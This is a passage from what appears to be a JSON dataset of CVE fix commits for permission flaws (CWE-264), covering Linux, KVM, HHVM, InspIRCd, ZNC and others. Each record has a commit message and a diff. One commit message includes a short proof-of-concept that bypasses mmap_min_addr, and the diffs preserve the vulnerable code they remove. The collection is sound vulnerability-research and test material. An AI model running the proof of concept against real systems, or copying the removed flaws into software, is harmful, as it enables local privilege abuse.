0; i < priv->allowed_device_glob_count; i++) {\n+\t\tif (g_str_equal (priv->allowed_device_globs[i], \"bluetooth\")) {\n+#ifdef HAVE_BLUEZ\n+\t\t\tif (bachk (IN_device_path) == 0) {\n+\t\t\t\tallowed = TRUE;\n+\t\t\t\tbreak;\n+\t\t\t}\n+#else\n+\t\t\tcontinue;\n+#endif \/* HAVE_BLUEZ *\/\n+\t\t}\n+\t\tif (g_pattern_match_simple (priv->allowed_device_globs[i],\n+\t\t\t\t\t    IN_device_path)) {\n+\t\t\tallowed = TRUE;\n+\t\t\tbreak;\n+\t\t}\n+\t}\n+\tif (allowed == FALSE) {\n+\t\tg_warning (\"The device path %s is not allowed by config file\",\n+\t\t\t   IN_device_path);\n+\t\tGError *error = NULL;\n+\t\terror = g_error_new (GYPSY_SERVER_ERROR,\n+\t\t\t\t     GYPSY_SERVER_ERROR_BAD_PATH,\n+\t\t\t\t     \"Bad path: %s\",\n+\t\t\t\t     IN_device_path);\n+\t\tdbus_g_method_return_error (context, error);\n+\t\tg_error_free (error);\n+\t\treturn;\n+\t}\n+\n \tdevice_name = g_path_get_basename (IN_device_path);\n \tGYPSY_NOTE (SERVER, \"Device name: %s\", device_name);\n \tpath = g_strdup_printf (\"%s%s\", GYPSY_GPS_PATH, \n@@ -252,6 +299,7 @@ gypsy_server_init (GypsyServer *gps)\n {\n \tGypsyServerPrivate *priv = GET_PRIVATE (gps);\n \tGError *error = NULL;\n+\tGKeyFile *key_file = NULL;\n \n \tpriv->connection = dbus_g_bus_get (DBUS_BUS_SYSTEM, &error);\n \tif (priv->connection == NULL) {\n@@ -267,6 +315,27 @@ gypsy_server_init (GypsyServer *gps)\n \n \tpriv->client_count = 0;\n \tpriv->terminate_id = 0;\n+\n+\tkey_file = g_key_file_new();\n+\tif (!g_key_file_load_from_file (key_file, CONFIG_FILE_PATH,\n+\t\t\t\t       G_KEY_FILE_NONE, &error))\n+\t\tgoto error;\n+\n+\tpriv->allowed_device_globs = g_key_file_get_string_list (key_file,\n+\t\t\t\t\t\t\t\t GYPSY_CONF_GROUP,\n+\t\t\t\t\t\t\t\t GYPSY_CONF_GLOB_KEY,\n+\t\t\t\t\t\t\t\t &(priv->allowed_device_glob_count),\n+\t\t\t\t\t\t\t\t &error);\n+\tif (!priv->allowed_device_globs)\n+\t\tgoto error;\n+\n+\treturn;\n+\n+error:\n+\tg_warning (\"Error parsing config file:\\n%s\",\n+\t\t   error->message);\n+\tg_error_free (error);\n+\tg_key_file_free (key_file);\n }\n \n void\ndiff --git a\/src\/gypsy-server.h b\/src\/gypsy-server.h\nindex c53df51..ae5578f 100644\n--- a\/src\/gypsy-server.h\n+++ b\/src\/gypsy-server.h\n@@ -37,6 +37,7 @@ G_BEGIN_DECLS\n \n typedef enum {\n \tGYPSY_SERVER_ERROR_NO_CLIENT,\n+\tGYPSY_SERVER_ERROR_BAD_PATH\n } GypsyServerError;\n \n typedef struct _GypsyServer {\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-4943","CWE_ID":"264","category":"security","commit_id":"3cf521f7dc87c031617fd47e4b7aa2593c2f3daf","commit_message":"From 3cf521f7dc87c031617fd47e4b7aa2593c2f3daf Mon Sep 17 00:00:00 2001\nFrom: Sasha Levin <sasha.levin@oracle.com>\nDate: Mon, 14 Jul 2014 17:02:31 -0700\nSubject: net\/l2tp: don't fall back on UDP [get|set]sockopt\n\nThe l2tp [get|set]sockopt() code has fallen back to the UDP functions\nfor socket option levels != SOL_PPPOL2TP since day one, but that has\nnever actually worked, since the l2tp socket isn't an inet socket.\n\nAs David Miller points out:\n\n  \"If we wanted this to work, it'd have to look up the tunnel and then\n   use tunnel->sk, but I wonder how useful that would be\"\n\nSince this can never have worked so nobody could possibly have depended\non that functionality, just remove the broken code and return -EINVAL.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com>\nAcked-by: James Chapman <jchapman@katalix.com>\nAcked-by: David Miller <davem@davemloft.net>\nCc: Phil Turnbull <phil.turnbull@oracle.com>\nCc: Vegard Nossum <vegard.nossum@oracle.com>\nCc: Willy Tarreau <w@1wt.eu>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n net\/l2tp\/l2tp_ppp.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/net\/l2tp\/l2tp_ppp.c b\/net\/l2tp\/l2tp_ppp.c\nindex 950909f04ee6..13752d96275e 100644\n--- a\/net\/l2tp\/l2tp_ppp.c\n+++ b\/net\/l2tp\/l2tp_ppp.c\n@@ -1365,7 +1365,7 @@ static int pppol2tp_setsockopt(struct socket *sock, int level, int optname,\n \tint err;\n \n \tif (level != SOL_PPPOL2TP)\n-\t\treturn udp_prot.setsockopt(sk, level, optname, optval, optlen);\n+\t\treturn -EINVAL;\n \n \tif (optlen < sizeof(int))\n \t\treturn -EINVAL;\n@@ -1491,7 +1491,7 @@ static int pppol2tp_getsockopt(struct socket *sock, int level, int optname,\n \tstruct pppol2tp_session *ps;\n \n \tif (level != SOL_PPPOL2TP)\n-\t\treturn udp_prot.getsockopt(sk, level, optname, optval, optlen);\n+\t\treturn -EINVAL;\n \n \tif (get_user(len, optlen))\n \t\treturn -EFAULT;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-3610","CWE_ID":"264","category":"security","commit_id":"854e8bb1aa06c578c2c9145fa6bfe3680ef63b23","commit_message":"From 854e8bb1aa06c578c2c9145fa6bfe3680ef63b23 Mon Sep 17 00:00:00 2001\nFrom: Nadav Amit <namit@cs.technion.ac.il>\nDate: Tue, 16 Sep 2014 03:24:05 +0300\nSubject: [PATCH] KVM: x86: Check non-canonical addresses upon WRMSR\n\nUpon WRMSR, the CPU should inject #GP if a non-canonical value (address) is\nwritten to certain MSRs. The behavior is \"almost\" identical for AMD and Intel\n(ignoring MSRs that are not implemented in either architecture since they would\nanyhow #GP). However, IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if\nnon-canonical address is written on Intel but not on AMD (which ignores the top\n32-bits).\n\nAccordingly, this patch injects a #GP on the MSRs which behave identically on\nIntel and AMD.  To eliminate the differences between the architecutres, the\nvalue which is written to IA32_SYSENTER_ESP and IA32_SYSENTER_EIP is turned to\ncanonical value before writing instead of injecting a #GP.\n\nSome references from Intel and AMD manuals:\n\nAccording to Intel SDM description of WRMSR instruction #GP is expected on\nWRMSR \"If the source register contains a non-canonical address and ECX\nspecifies one of the following MSRs: IA32_DS_AREA, IA32_FS_BASE, IA32_GS_BASE,\nIA32_KERNEL_GS_BASE, IA32_LSTAR, IA32_SYSENTER_EIP, IA32_SYSENTER_ESP.\"\n\nAccording to AMD manual instruction manual:\nLSTAR\/CSTAR (SYSCALL): \"The WRMSR instruction loads the target RIP into the\nLSTAR and CSTAR registers.  If an RIP written by WRMSR is not in canonical\nform, a general-protection exception (#GP) occurs.\"\nIA32_GS_BASE and IA32_FS_BASE (WRFSBASE\/WRGSBASE): \"The address written to the\nbase field must be in canonical form or a #GP fault will occur.\"\nIA32_KERNEL_GS_BASE (SWAPGS): \"The address stored in the KernelGSbase MSR must\nbe in canonical form.\"\n\nThis patch fixes CVE-2014-3610.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/include\/asm\/kvm_host.h | 14 ++++++++++++++\n arch\/x86\/kvm\/svm.c              |  2 +-\n arch\/x86\/kvm\/vmx.c              |  2 +-\n arch\/x86\/kvm\/x86.c              | 27 ++++++++++++++++++++++++++-\n 4 files changed, 42 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/include\/asm\/kvm_host.h b\/arch\/x86\/include\/asm\/kvm_host.h\nindex 7d603a71ab3a9..ccc94de4ac499 100644\n--- a\/arch\/x86\/include\/asm\/kvm_host.h\n+++ b\/arch\/x86\/include\/asm\/kvm_host.h\n@@ -989,6 +989,20 @@ static inline void kvm_inject_gp(struct kvm_vcpu *vcpu, u32 error_code)\n \tkvm_queue_exception_e(vcpu, GP_VECTOR, error_code);\n }\n \n+static inline u64 get_canonical(u64 la)\n+{\n+\treturn ((int64_t)la << 16) >> 16;\n+}\n+\n+static inline bool is_noncanonical_address(u64 la)\n+{\n+#ifdef CONFIG_X86_64\n+\treturn get_canonical(la) != la;\n+#else\n+\treturn false;\n+#endif\n+}\n+\n #define TSS_IOPB_BASE_OFFSET 0x66\n #define TSS_BASE_SIZE 0x68\n #define TSS_IOPB_SIZE (65536 \/ 8)\ndiff --git a\/arch\/x86\/kvm\/svm.c b\/arch\/x86\/kvm\/svm.c\nindex 65510f624dfe2..00bed2c5e948a 100644\n--- a\/arch\/x86\/kvm\/svm.c\n+++ b\/arch\/x86\/kvm\/svm.c\n@@ -3251,7 +3251,7 @@ static int wrmsr_interception(struct vcpu_svm *svm)\n \tmsr.host_initiated = false;\n \n \tsvm->next_rip = kvm_rip_read(&svm->vcpu) + 2;\n-\tif (svm_set_msr(&svm->vcpu, &msr)) {\n+\tif (kvm_set_msr(&svm->vcpu, &msr)) {\n \t\ttrace_kvm_msr_write_ex(ecx, data);\n \t\tkvm_inject_gp(&svm->vcpu, 0);\n \t} else {\ndiff --git a\/arch\/x86\/kvm\/vmx.c b\/arch\/x86\/kvm\/vmx.c\nindex 0acac81f198b0..148020a7dd980 100644\n--- a\/arch\/x86\/kvm\/vmx.c\n+++ b\/arch\/x86\/kvm\/vmx.c\n@@ -5291,7 +5291,7 @@ static int handle_wrmsr(struct kvm_vcpu *vcpu)\n \tmsr.data = data;\n \tmsr.index = ecx;\n \tmsr.host_initiated = false;\n-\tif (vmx_set_msr(vcpu, &msr) != 0) {\n+\tif (kvm_set_msr(vcpu, &msr) != 0) {\n \t\ttrace_kvm_msr_write_ex(ecx, data);\n \t\tkvm_inject_gp(vcpu, 0);\n \t\treturn 1;\ndiff --git a\/arch\/x86\/kvm\/x86.c b\/arch\/x86\/kvm\/x86.c\nindex 34c8f94331f83..5a7195573a327 100644\n--- a\/arch\/x86\/kvm\/x86.c\n+++ b\/arch\/x86\/kvm\/x86.c\n@@ -987,7 +987,6 @@ void kvm_enable_efer_bits(u64 mask)\n }\n EXPORT_SYMBOL_GPL(kvm_enable_efer_bits);\n \n-\n \/*\n  * Writes msr value into into the appropriate \"register\".\n  * Returns 0 on success, non-0 otherwise.\n@@ -995,8 +994,34 @@ EXPORT_SYMBOL_GPL(kvm_enable_efer_bits);\n  *\/\n int kvm_set_msr(struct kvm_vcpu *vcpu, struct msr_data *msr)\n {\n+\tswitch (msr->index) {\n+\tcase MSR_FS_BASE:\n+\tcase MSR_GS_BASE:\n+\tcase MSR_KERNEL_GS_BASE:\n+\tcase MSR_CSTAR:\n+\tcase MSR_LSTAR:\n+\t\tif (is_noncanonical_address(msr->data))\n+\t\t\treturn 1;\n+\t\tbreak;\n+\tcase MSR_IA32_SYSENTER_EIP:\n+\tcase MSR_IA32_SYSENTER_ESP:\n+\t\t\/*\n+\t\t * IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if\n+\t\t * non-canonical address is written on Intel but not on\n+\t\t * AMD (which ignores the top 32-bits, because it does\n+\t\t * not implement 64-bit SYSENTER).\n+\t\t *\n+\t\t * 64-bit code should hence be able to write a non-canonical\n+\t\t * value on AMD.  Making the address canonical ensures that\n+\t\t * vmentry does not fail on Intel after writing a non-canonical\n+\t\t * value, and that something deterministic happens if the guest\n+\t\t * invokes 64-bit SYSENTER.\n+\t\t *\/\n+\t\tmsr->data = get_canonical(msr->data);\n+\t}\n \treturn kvm_x86_ops->set_msr(vcpu, msr);\n }\n+EXPORT_SYMBOL_GPL(kvm_set_msr);\n \n \/*\n  * Adapt set_msr() to msr_io()'s calling convention\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-4346","CWE_ID":"264","category":"security","commit_id":"462e635e5b73ba9a4c03913b77138cd57ce4b050","commit_message":"From 462e635e5b73ba9a4c03913b77138cd57ce4b050 Mon Sep 17 00:00:00 2001\nFrom: Tavis Ormandy <taviso@cmpxchg8b.com>\nDate: Thu, 9 Dec 2010 15:29:42 +0100\nSubject: install_special_mapping skips security_file_mmap check.\n\nThe install_special_mapping routine (used, for example, to setup the\nvdso) skips the security check before insert_vm_struct, allowing a local\nattacker to bypass the mmap_min_addr security restriction by limiting\nthe available pages for special mappings.\n\nbprm_mm_init() also skips the check, and although I don't think this can\nbe used to bypass any restrictions, I don't see any reason not to have\nthe security check.\n\n  $ uname -m\n  x86_64\n  $ cat \/proc\/sys\/vm\/mmap_min_addr\n  65536\n  $ cat install_special_mapping.s\n  section .bss\n      resb BSS_SIZE\n  section .text\n      global _start\n      _start:\n          mov     eax, __NR_pause\n          int     0x80\n  $ nasm -D__NR_pause=29 -DBSS_SIZE=0xfffed000 -f elf -o install_special_mapping.o install_special_mapping.s\n  $ ld -m elf_i386 -Ttext=0x10000 -Tbss=0x11000 -o install_special_mapping install_special_mapping.o\n  $ .\/install_special_mapping &\n  [1] 14303\n  $ cat \/proc\/14303\/maps\n  0000f000-00010000 r-xp 00000000 00:00 0                                  [vdso]\n  00010000-00011000 r-xp 00001000 00:19 2453665                            \/home\/taviso\/install_special_mapping\n  00011000-ffffe000 rwxp 00000000 00:00 0                                  [stack]\n\nIt's worth noting that Red Hat are shipping with mmap_min_addr set to\n4096.\n\nSigned-off-by: Tavis Ormandy <taviso@google.com>\nAcked-by: Kees Cook <kees@ubuntu.com>\nAcked-by: Robert Swiecki <swiecki@google.com>\n[ Changed to not drop the error code - akpm ]\nReviewed-by: James Morris <jmorris@namei.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/exec.c |  5 +++++\n mm\/mmap.c | 16 ++++++++++++----\n 2 files changed, 17 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/fs\/exec.c b\/fs\/exec.c\nindex d68c378a3137..c62efcb959c7 100644\n--- a\/fs\/exec.c\n+++ b\/fs\/exec.c\n@@ -275,6 +275,11 @@ static int __bprm_mm_init(struct linux_binprm *bprm)\n \tvma->vm_flags = VM_STACK_FLAGS | VM_STACK_INCOMPLETE_SETUP;\n \tvma->vm_page_prot = vm_get_page_prot(vma->vm_flags);\n \tINIT_LIST_HEAD(&vma->anon_vma_chain);\n+\n+\terr = security_file_mmap(NULL, 0, 0, 0, vma->vm_start, 1);\n+\tif (err)\n+\t\tgoto err;\n+\n \terr = insert_vm_struct(mm, vma);\n \tif (err)\n \t\tgoto err;\ndiff --git a\/mm\/mmap.c b\/mm\/mmap.c\nindex b179abb1474a..50a4aa0255a0 100644\n--- a\/mm\/mmap.c\n+++ b\/mm\/mmap.c\n@@ -2462,6 +2462,7 @@ int install_special_mapping(struct mm_struct *mm,\n \t\t\t    unsigned long addr, unsigned long len,\n \t\t\t    unsigned long vm_flags, struct page **pages)\n {\n+\tint ret;\n \tstruct vm_area_struct *vma;\n \n \tvma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);\n@@ -2479,16 +2480,23 @@ int install_special_mapping(struct mm_struct *mm,\n \tvma->vm_ops = &special_mapping_vmops;\n \tvma->vm_private_data = pages;\n \n-\tif (unlikely(insert_vm_struct(mm, vma))) {\n-\t\tkmem_cache_free(vm_area_cachep, vma);\n-\t\treturn -ENOMEM;\n-\t}\n+\tret = security_file_mmap(NULL, 0, 0, 0, vma->vm_start, 1);\n+\tif (ret)\n+\t\tgoto out;\n+\n+\tret = insert_vm_struct(mm, vma);\n+\tif (ret)\n+\t\tgoto out;\n \n \tmm->total_vm += len >> PAGE_SHIFT;\n \n \tperf_event_mmap(vma);\n \n \treturn 0;\n+\n+out:\n+\tkmem_cache_free(vm_area_cachep, vma);\n+\treturn ret;\n }\n \n static DEFINE_MUTEX(mm_all_locks_mutex);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-2209","CWE_ID":"264","category":"security","commit_id":"851fff90a9b7461df2393af32239ba217bc25946","commit_message":"From 851fff90a9b7461df2393af32239ba217bc25946 Mon Sep 17 00:00:00 2001\nFrom: Otto Ebeling <otto@fb.com>\nDate: Mon, 28 Apr 2014 11:19:44 -0700\nSubject: [PATCH] Drop supplementary groups when changing to non-root\n\nSummary: When running HHVM as a non-root user, UID and GID are updated correctly but supplementary groups are not dropped properly. This runs initgroups inside main thread and lightprocess threads to reset groups to those of the specified non-root user.\n\nReviewed By: @markw65\n\nDifferential Revision: D1193229\n---\n hphp\/util\/capability.cpp    | 7 +++++++\n hphp\/util\/light-process.cpp | 2 ++\n 2 files changed, 9 insertions(+)\n\n","diff_code":"diff --git a\/hphp\/util\/capability.cpp b\/hphp\/util\/capability.cpp\nindex 56133790c46..e4c9df2070d 100644\n--- a\/hphp\/util\/capability.cpp\n+++ b\/hphp\/util\/capability.cpp\n@@ -24,6 +24,7 @@\n #include <sys\/prctl.h>\n #include <sys\/types.h>\n #include <pwd.h>\n+#include <grp.h>\n \n namespace HPHP {\n \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\n@@ -102,6 +103,12 @@ bool Capability::ChangeUnixUser(uid_t uid) {\n       return false;\n     }\n \n+    if (initgroups(pw->pw_name, pw->pw_gid) < 0) {\n+      Logger::Error(\"unable to drop supplementary group privs: %s\",\n+                    folly::errnoStr(errno).c_str());\n+      return false;\n+    }\n+\n     if (pw->pw_gid == 0 || setgid(pw->pw_gid) < 0) {\n       Logger::Error(\"unable to drop gid privs: %s\",\n                     folly::errnoStr(errno).c_str());\ndiff --git a\/hphp\/util\/light-process.cpp b\/hphp\/util\/light-process.cpp\nindex 02d2c84260f..3c67c32e66b 100644\n--- a\/hphp\/util\/light-process.cpp\n+++ b\/hphp\/util\/light-process.cpp\n@@ -25,6 +25,7 @@\n #include <sys\/socket.h>\n \n #include <afdt.h>\n+#include <grp.h>\n #include <stdlib.h>\n #include <unistd.h>\n #include <poll.h>\n@@ -299,6 +300,7 @@ static void do_change_user(FILE *fin, FILE *fout) {\n     struct passwd *pw = getpwnam(uname.c_str());\n     if (pw) {\n       if (pw->pw_gid) {\n+        initgroups(pw->pw_name, pw->pw_gid);\n         setgid(pw->pw_gid);\n       }\n       if (pw->pw_uid) {\n","owner":"facebook","repo":"hhvm","source":"cve"},{"CVE_ID":"CVE-2016-7142","CWE_ID":"264","category":"security","commit_id":"74fafb7f11b06747f69f182ad5e3769b665eea7a","commit_message":"From 74fafb7f11b06747f69f182ad5e3769b665eea7a Mon Sep 17 00:00:00 2001\nFrom: Adam <Adam@anope.org>\nDate: Fri, 2 Sep 2016 22:57:03 -0400\nSubject: [PATCH] m_sasl: don't allow AUTHENTICATE with mechanisms with a space\n\n---\n src\/modules\/m_sasl.cpp | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/src\/modules\/m_sasl.cpp b\/src\/modules\/m_sasl.cpp\nindex 9cb5592d1f..16a15357f5 100644\n--- a\/src\/modules\/m_sasl.cpp\n+++ b\/src\/modules\/m_sasl.cpp\n@@ -189,6 +189,7 @@ class CommandAuthenticate : public Command\n \t\t: Command(Creator, \"AUTHENTICATE\", 1), authExt(ext), cap(Cap)\n \t{\n \t\tworks_before_reg = true;\n+\t\tallow_empty_last_param = false;\n \t}\n \n \tCmdResult Handle (const std::vector<std::string>& parameters, User *user)\n@@ -199,6 +200,9 @@ class CommandAuthenticate : public Command\n \t\t\tif (!cap.ext.get(user))\n \t\t\t\treturn CMD_FAILURE;\n \n+\t\t\tif (parameters[0].find(' ') != std::string::npos || parameters[0][0] == ':')\n+\t\t\t\treturn CMD_FAILURE;\n+\n \t\t\tSaslAuthenticator *sasl = authExt.get(user);\n \t\t\tif (!sasl)\n \t\t\t\tauthExt.set(user, new SaslAuthenticator(user, parameters[0]));\n","owner":"inspircd","repo":"inspircd","source":"cve"},{"CVE_ID":"CVE-2014-7975","CWE_ID":"264","category":"security","commit_id":"a1480dcc3c706e309a88884723446f2e84fedd5b","commit_message":"From a1480dcc3c706e309a88884723446f2e84fedd5b Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@amacapital.net>\nDate: Wed, 8 Oct 2014 12:32:47 -0700\nSubject: fs: Add a missing permission check to do_umount\n\nAccessing do_remount_sb should require global CAP_SYS_ADMIN, but\nonly one of the two call sites was appropriately protected.\n\nFixes CVE-2014-7975.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\n---\n fs\/namespace.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n","diff_code":"diff --git a\/fs\/namespace.c b\/fs\/namespace.c\nindex ef42d9bee212..7f67b463a5b4 100644\n--- a\/fs\/namespace.c\n+++ b\/fs\/namespace.c\n@@ -1356,6 +1356,8 @@ static int do_umount(struct mount *mnt, int flags)\n \t\t * Special case for \"unmounting\" root ...\n \t\t * we just try to remount it readonly.\n \t\t *\/\n+\t\tif (!capable(CAP_SYS_ADMIN))\n+\t\t\treturn -EPERM;\n \t\tdown_write(&sb->s_umount);\n \t\tif (!(sb->s_flags & MS_RDONLY))\n \t\t\tretval = do_remount_sb(sb, MS_RDONLY, NULL, 0);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2018-14055","CWE_ID":"264","category":"security","commit_id":"d22fef8620cdd87490754f607e7153979731c69d","commit_message":"From d22fef8620cdd87490754f607e7153979731c69d Mon Sep 17 00:00:00 2001\nFrom: Alexey Sokolov <alexey+znc@asokolov.org>\nDate: Fri, 13 Jul 2018 22:50:47 +0100\nSubject: [PATCH] Better cleanup lines coming from network.\n\nThanks for Jeriko One <jeriko.one@gmx.us> for finding and reporting this.\n---\n src\/Client.cpp  | 3 ++-\n src\/IRCSock.cpp | 3 ++-\n 2 files changed, 4 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/src\/Client.cpp b\/src\/Client.cpp\nindex cec976c53..c0efd6283 100644\n--- a\/src\/Client.cpp\n+++ b\/src\/Client.cpp\n@@ -103,7 +103,8 @@ void CClient::ReadLine(const CString& sData) {\n     CLanguageScope user_lang(GetUser() ? GetUser()->GetLanguage() : \"\");\n     CString sLine = sData;\n \n-    sLine.TrimRight(\"\\n\\r\");\n+    sLine.Replace(\"\\n\", \"\");\n+    sLine.Replace(\"\\r\", \"\");\n \n     DEBUG(\"(\" << GetFullName() << \") CLI -> ZNC [\"\n         << CDebug::Filter(sLine) << \"]\");\ndiff --git a\/src\/IRCSock.cpp b\/src\/IRCSock.cpp\nindex e9db5447c..259881dc8 100644\n--- a\/src\/IRCSock.cpp\n+++ b\/src\/IRCSock.cpp\n@@ -156,7 +156,8 @@ void CIRCSock::Quit(const CString& sQuitMsg) {\n void CIRCSock::ReadLine(const CString& sData) {\n     CString sLine = sData;\n \n-    sLine.TrimRight(\"\\n\\r\");\n+    sLine.Replace(\"\\n\", \"\");\n+    sLine.Replace(\"\\r\", \"\");\n \n     DEBUG(\"(\" << m_pNetwork->GetUser()->GetUserName() << \"\/\"\n               << m_pNetwork->GetName() << \") IRC -> ZNC [\" << sLine << \"]\");\n","owner":"znc","repo":"znc","source":"cve"},{"CVE_ID":"CVE-2017-16939","CWE_ID":"264","category":"security","commit_id":"1137b5e2529a8f5ca8ee709288ecba3e68044df2","commit_message":"From 1137b5e2529a8f5ca8ee709288ecba3e68044df2 Mon Sep 17 00:00:00 2001\nFrom: Herbert Xu <herbert@gondor.apana.org.au>\nDate: Thu, 19 Oct 2017 20:51:10 +0800\nSubject: [PATCH] ipsec: Fix aborted xfrm policy dump crash\n\nAn independent security researcher, Mohamed Ghannam, has reported\nthis vulnerability to Beyond Security's SecuriTeam Secure Disclosure\nprogram.\n\nThe xfrm_dump_policy_done function expects xfrm_dump_policy to\nhave been called at least once or it will crash.  This can be\ntriggered if a dump fails because the target socket's receive\nbuffer is full.\n\nThis patch fixes it by using the cb->start mechanism to ensure that\nthe initialisation is always done regardless of the buffer situation.\n\nFixes: 12a169e7d8f4 (\"ipsec: Put dumpers on the dump list\")\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: Steffen Klassert <steffen.klassert@secunet.com>\n---\n net\/xfrm\/xfrm_user.c | 25 +++++++++++++++----------\n 1 file changed, 15 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/net\/xfrm\/xfrm_user.c b\/net\/xfrm\/xfrm_user.c\nindex b997f1395357e..e44a0fed48dd0 100644\n--- a\/net\/xfrm\/xfrm_user.c\n+++ b\/net\/xfrm\/xfrm_user.c\n@@ -1693,32 +1693,34 @@ static int dump_one_policy(struct xfrm_policy *xp, int dir, int count, void *ptr\n \n static int xfrm_dump_policy_done(struct netlink_callback *cb)\n {\n-\tstruct xfrm_policy_walk *walk = (struct xfrm_policy_walk *) &cb->args[1];\n+\tstruct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;\n \tstruct net *net = sock_net(cb->skb->sk);\n \n \txfrm_policy_walk_done(walk, net);\n \treturn 0;\n }\n \n+static int xfrm_dump_policy_start(struct netlink_callback *cb)\n+{\n+\tstruct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;\n+\n+\tBUILD_BUG_ON(sizeof(*walk) > sizeof(cb->args));\n+\n+\txfrm_policy_walk_init(walk, XFRM_POLICY_TYPE_ANY);\n+\treturn 0;\n+}\n+\n static int xfrm_dump_policy(struct sk_buff *skb, struct netlink_callback *cb)\n {\n \tstruct net *net = sock_net(skb->sk);\n-\tstruct xfrm_policy_walk *walk = (struct xfrm_policy_walk *) &cb->args[1];\n+\tstruct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;\n \tstruct xfrm_dump_info info;\n \n-\tBUILD_BUG_ON(sizeof(struct xfrm_policy_walk) >\n-\t\t     sizeof(cb->args) - sizeof(cb->args[0]));\n-\n \tinfo.in_skb = cb->skb;\n \tinfo.out_skb = skb;\n \tinfo.nlmsg_seq = cb->nlh->nlmsg_seq;\n \tinfo.nlmsg_flags = NLM_F_MULTI;\n \n-\tif (!cb->args[0]) {\n-\t\tcb->args[0] = 1;\n-\t\txfrm_policy_walk_init(walk, XFRM_POLICY_TYPE_ANY);\n-\t}\n-\n \t(void) xfrm_policy_walk(net, walk, dump_one_policy, &info);\n \n \treturn skb->len;\n@@ -2474,6 +2476,7 @@ static const struct nla_policy xfrma_spd_policy[XFRMA_SPD_MAX+1] = {\n \n static const struct xfrm_link {\n \tint (*doit)(struct sk_buff *, struct nlmsghdr *, struct nlattr **);\n+\tint (*start)(struct netlink_callback *);\n \tint (*dump)(struct sk_buff *, struct netlink_callback *);\n \tint (*done)(struct netlink_callback *);\n \tconst struct nla_policy *nla_pol;\n@@ -2487,6 +2490,7 @@ static const struct xfrm_link {\n \t[XFRM_MSG_NEWPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },\n \t[XFRM_MSG_DELPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy    },\n \t[XFRM_MSG_GETPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy,\n+\t\t\t\t\t\t   .start = xfrm_dump_policy_start,\n \t\t\t\t\t\t   .dump = xfrm_dump_policy,\n \t\t\t\t\t\t   .done = xfrm_dump_policy_done },\n \t[XFRM_MSG_ALLOCSPI    - XFRM_MSG_BASE] = { .doit = xfrm_alloc_userspi },\n@@ -2539,6 +2543,7 @@ static int xfrm_user_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh,\n \n \t\t{\n \t\t\tstruct netlink_dump_control c = {\n+\t\t\t\t.start = link->start,\n \t\t\t\t.dump = link->dump,\n \t\t\t\t.done = link->done,\n \t\t\t};\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-8966","CWE_ID":"264","category":"security","commit_id":"76cc404bfdc0d419c720de4daaf2584542734f42","commit_message":"From 76cc404bfdc0d419c720de4daaf2584542734f42 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 28 Dec 2015 20:47:08 -0500\nSubject: [PATCH] [PATCH] arm: fix handling of F_OFD_... in oabi_fcntl64()\n\nCc: stable@vger.kernel.org # 3.15+\nReviewed-by: Jeff Layton <jeff.layton@primarydata.com>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/arm\/kernel\/sys_oabi-compat.c | 73 ++++++++++++++++---------------\n 1 file changed, 37 insertions(+), 36 deletions(-)\n\n","diff_code":"diff --git a\/arch\/arm\/kernel\/sys_oabi-compat.c b\/arch\/arm\/kernel\/sys_oabi-compat.c\nindex b83f3b7737fb9..087acb569b63a 100644\n--- a\/arch\/arm\/kernel\/sys_oabi-compat.c\n+++ b\/arch\/arm\/kernel\/sys_oabi-compat.c\n@@ -193,15 +193,44 @@ struct oabi_flock64 {\n \tpid_t\tl_pid;\n } __attribute__ ((packed,aligned(4)));\n \n-asmlinkage long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd,\n+static long do_locks(unsigned int fd, unsigned int cmd,\n \t\t\t\t unsigned long arg)\n {\n-\tstruct oabi_flock64 user;\n \tstruct flock64 kernel;\n-\tmm_segment_t fs = USER_DS; \/* initialized to kill a warning 